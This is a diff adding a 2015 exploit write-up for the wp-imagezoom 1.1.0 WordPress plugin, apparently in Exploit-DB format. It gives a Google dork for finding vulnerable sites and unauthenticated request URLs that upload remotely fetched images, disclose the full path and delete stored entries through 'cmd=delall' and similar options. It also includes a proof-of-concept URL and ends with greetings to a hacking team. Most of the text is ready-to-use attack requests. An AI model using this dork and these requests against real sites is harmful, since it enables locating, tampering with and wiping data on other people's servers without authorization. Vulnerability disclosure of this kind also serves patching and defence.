@@ -1,0 +1,31 @@
+# Exploit Title: wp-imagezoom Remote Image Upload
+# Google Dork: filetype:php inurl:"/wp-content/plugins/wp-imagezoom" & inurl:"?id="
+# Date: 06.06.2015
+# Exploit Author: T3N38R15
+# Software Link: https://downloads.wordpress.org/plugin/wp-imagezoom.1.1.0.zip
+# Version: 1.1.0
+# Tested on: 	Windows	(Firefox)
+		Linux	(Firefox)
+
+The affected file is the div_img.php it allowed anybody to upload jpg files.
+/wp-content/plugins/wp-imagezoom/div_img.php?src=http://domain.com/img.jpg&cl=100&dl=100
+would upload the file to the default directory :
+/wp-content/plugins/wp-imagezoom/work/http_cln__sls__sls_domain.com_sls_img.jpg/
+the first one is then your picture ( it is only 469x469 the rest is cut out ), the other are zoomed/cuttet version of it.
+
+it also support a FPD : 
+http://domain.com/wp-content/plugins/wp-imagezoom/div_img.php?src=
+the variable org_img have the value of the current location to the work directory.
+
+We can also delete entry's with
+http://domain.com/wp-content/plugins/wp-imagezoom/div_img.php?cmd=
+following options are avaliable for the cmd parameter :
+http://domain.com/wp-content/plugins/wp-imagezoom/div_img.php?cmd=delall
+http://domain.com/wp-content/plugins/wp-imagezoom/div_img.php?cmd=delunn
+http://domain.com/wp-content/plugins/wp-imagezoom/div_img.php?cmd=delone&src=yourwisheddeleted
+http://domain.com/wp-content/plugins/wp-imagezoom/div_img.php?cmd=delovr&maxsize=size of image
+
+Proof of concept : http://domain.com/wp-content/plugins/wp-imagezoom/div_img.php?src=http://static.zerochan.net/Frankenstein.(Noblesse).full.415661.jpg&cl=100&dl=100
+
+Greets to Team Madleets/leets.pro & VIRkid ;)
+Regards T3N38R15
